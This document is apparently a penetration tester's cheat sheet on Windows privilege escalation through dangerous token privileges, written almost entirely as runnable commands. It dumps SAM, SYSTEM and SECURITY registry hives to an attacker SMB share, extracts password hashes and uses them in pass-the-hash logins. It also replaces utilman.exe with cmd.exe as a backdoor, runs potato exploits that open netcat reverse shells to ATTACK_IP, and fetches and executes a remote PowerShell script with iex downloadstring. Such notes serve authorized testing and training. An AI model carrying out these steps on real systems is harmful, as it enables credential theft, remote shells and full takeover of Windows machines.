# Windows Privileges

## Privilege check command: whoami /priv

## Examples of dangerous privileges:

### SeBackup/SeRestore

#### 1: Backup SAM and SYSTEM hashes

    cd /

    mkdir temp

    cd temp

    req save hklm\system c:\temp\system

    req save hklm\sam c:\temp\sam

    download sam

    download system

#### 2: Create SMB Server on attacking machine

    mkdir share

    impacket-smbserver -smb2support -username USER -password PASSWORD public share

#### 3: Copy backups to share folder

    copy c:\users\user\sam.hive \\ATTACK_IP\public\

    copy c:\users\user\system.hive \\ATTACK_IP\public\

#### 4: Retrieve hashes

    impacket-secretsdump -sam sam.hive -system system.hive LOCAL

## OR 

    pypykatz registry --sam sam system

#### 5: Pass-The-Hash Attack (PtH)

    impacket-psexec -hashes HASH administrator@TARGET_IP

#### TIP: We can also use evil-winrm for PtH attacks.

    evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'

## Alternate Method to transfer the Hives: reg.py  remotely on Linux

    python smbserver.py -smb2support share /tmp

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'

## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege

### Usage:

    Import-Module .\SeBackupPrivilegeUtils.dll

    Import-Module .\SeBackupPrivilegeCmdLets.dll

    Set-SeBackupPrivilege

    Get-SeBackupPrivilege

## Alternate Method: Robocopy

    robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B

    type C:\Users\Public\root.txt

## SeTakeOwnership

#### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.

### Example: Utilman.exe

#### 1: 

    takeown /f c:\windows\system32\utilman.exe

#### 2: 

    icacls c:\windows\system32\utilman.exe /grant USER:F

#### 3: 

    copy cmd.exe utilman.exe

#### 4: Trigger utilman : Lock screen, click ease of access

## SeImpersonate/SeAssignPrimaryToken

### A lot of potato exploits work with these privileges, so in our example we will talk about RoguePotato.

#### RogueWinRM.exe exploit

#### 1: Start listener

    c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"

## Tool: PrintSpoofer

## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

## Tool: Invoke-BadPotato

## Link: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1

Download the script on our target machine

    iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-BadPotato.ps1')

Run the script to get system

    Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe ATTACK_IP PORT"

## Tool: RottenPotato

    RottenPotato.exe -r -c "cmd.exe"

## SeDebug Privilege

### Tools: Meterpreter, https://github.com/decoder-it/psgetsystem

### Steps:

#### 1) 

    Get-Process winlogon (Check for a specific SYSTEM level process running on the machine)

#### 2) Download and execute Meterpreter on target machine to connect to us

#### 3) 

    ps (Check for processes running as SYSTEM. Example: winlogon.exe)

#### 4) 

    migrate PID (Take ownership of the elevated process)

#### 5) VOILA!

## TIP: If the SeDebug Privilege is disabled, we can enable it with psgetsystem powershell script (Link attached at the top of this attack's explanation)

### Alternate Method for SeImpersonate and SeDebug: 

https://github.com/0xCyberY/Exploit-SeImpersonatePrivilege-and-SeDebugPrivilege
